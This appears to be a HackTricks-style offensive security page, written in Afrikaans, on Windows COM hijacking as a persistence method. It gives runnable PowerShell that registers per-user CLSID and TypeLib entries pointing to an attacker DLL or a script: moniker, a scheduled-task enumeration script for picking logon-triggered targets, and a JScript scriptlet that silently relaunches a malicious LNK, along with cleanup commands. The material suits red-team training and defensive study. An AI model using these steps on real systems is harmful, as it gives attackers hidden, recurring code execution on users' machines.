# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Soek na nie-bestaande COM-komponente

Aangesien die waardes van HKCU deur gebruikers verander kan word, kan **COM Hijacking** gebruik word as **persistente meganismes**. Deur `procmon` te gebruik is dit maklik om gesoekte COM-registrasies te vind wat nie bestaan nie en wat 'n aanvaller kan skep om blywende toegang te kry. Filters:

- **RegOpenKey** operasies.
- waar die _Result_ is **NAME NOT FOUND**.
- en die _Path_ eindig op **InprocServer32**.

Sodra jy besluit het watter nie-bestaande COM jy wil naboots, voer die volgende opdragte uit. _Wees versigtig as jy besluit om 'n COM te naboots wat elke paar sekondes gelaai word, aangesien dit oorbodig kan wees._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Gekaapbare Task Scheduler COM-komponente

Windows Tasks gebruik Custom Triggers om COM objects aan te roep, en omdat hulle deur die Task Scheduler uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Deur die uitset na te gaan kan jy byvoorbeeld een kies wat uitgevoer gaan word **elke keer as 'n gebruiker aanmeld**.

As jy nou vir die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** en in HKLM en HKCU soek, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dan kan jy net die HKCU-inskrywing skep en elke keer wanneer die gebruiker aanmeld, sal jou backdoor geaktiveer word.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieer COM-koppelvlakke en word gelaai via `LoadTypeLib()`. Wanneer 'n COM-server geïnstantieer word, kan die OS ook die geassosieerde TypeLib laai deur register-sleutels onder `HKCR\TypeLib\{LIBID}` te raadpleeg. As die TypeLib-pad vervang word met 'n **moniker**, bv. `script:C:\...\evil.sct`, sal Windows die scriptlet uitvoer wanneer die TypeLib opgelos word – wat 'n stealthy persistence lewer wat aktiveer wanneer algemene komponente aangeraak word.

Dit is waargeneem teen die Microsoft Web Browser control (gereeld gelaai deur Internet Explorer, toepassings wat WebBrowser inbed, en selfs `explorer.exe`).

### Steps (PowerShell)

1) Identifiseer die TypeLib (LIBID) wat deur 'n veelgebruikte CLSID gebruik word. Voorbeeld CLSID wat dikwels deur malware chains misbruik word: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Wys die per-gebruiker TypeLib-pad na 'n plaaslike scriptlet met die `script:` moniker (geen administrateurregte benodig):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Plaas 'n minimale JScript `.sct` neer wat jou primêre payload herbegin (bv. 'n `.lnk` wat deur die aanvanklike ketting gebruik word):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Aktivering – die opening van IE, 'n toepassing wat die WebBrowser control inkorporeer, of selfs gewone Explorer-aktiwiteit sal die TypeLib laai en die scriptlet uitvoer, en jou ketting by aanmelding/herbegin herbewapen.

Opschoning
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notes
- Jy kan dieselfde logika toepas op ander veelgebruikte COM-komponente; los altyd eers die werklike `LIBID` vanaf `HKCR\CLSID\{CLSID}\TypeLib` op.
- Op 64-bit stelsels kan jy ook die `win64` subsleutel invul vir 64-bit verbruikers.

## Verwysings

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
